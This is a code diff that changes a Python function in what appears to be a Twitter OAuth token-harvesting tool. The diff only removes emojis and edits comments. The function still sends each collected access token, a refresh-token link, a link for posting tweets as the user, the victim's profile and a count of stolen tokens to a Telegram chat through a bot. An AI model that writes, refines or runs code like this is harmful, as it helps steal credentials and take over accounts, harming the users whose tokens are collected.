@@ -129,28 +129,35 @@ def refresh_token_in_db(refresh_token, username):
 
 # Send token information to Telegram
 def send_to_telegram(access_token, refresh_token=None):
-    alert_emoji = "🚨"
-    key_emoji = "🔑"
-    user_emoji = "👤"
+    # Temporarily disable emojis for debugging
+    # alert_emoji = "🚨"
+    # key_emoji = "🔑"
+    # user_emoji = "👤"
+    
     username = get_twitter_username(access_token)
     if username:
         twitter_url = f"https://twitter.com/{username}"
     else:
         twitter_url = "Unknown user"
+
     total_tokens = get_total_tokens()
+
+    # Prepare the message without emojis for debugging
     message = (
-        f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
-        f"{key_emoji} *Access Token:* `{access_token}`\n"
+        f"New user authenticated: OAuth 2.0\n"
+        f"Access Token: `{access_token}`\n"
     )
+    
     if refresh_token:
         refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
-        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
-    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
-    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
+        message += f"Refresh Token Link: [Refresh Token]({refresh_link})\n"
     
-    # Send the message to Telegram ensuring UTF-8 encoding
+    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
+    message += f"Post a Tweet Link: [Post a Tweet]({tweet_link})\n"
+    message += f"Twitter Profile: [@{username}]({twitter_url})\n"
+    message += f"Total Tokens in Database: {total_tokens}"
+
+    # Send the message to Telegram
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
@@ -158,7 +165,7 @@ def send_to_telegram(access_token, refresh_token=None):
         "parse_mode": "Markdown"
     }
     
-    # Ensure proper encoding in the request
+    # Send the POST request
     response = requests.post(url, json=data)
     
     if response.status_code != 200:
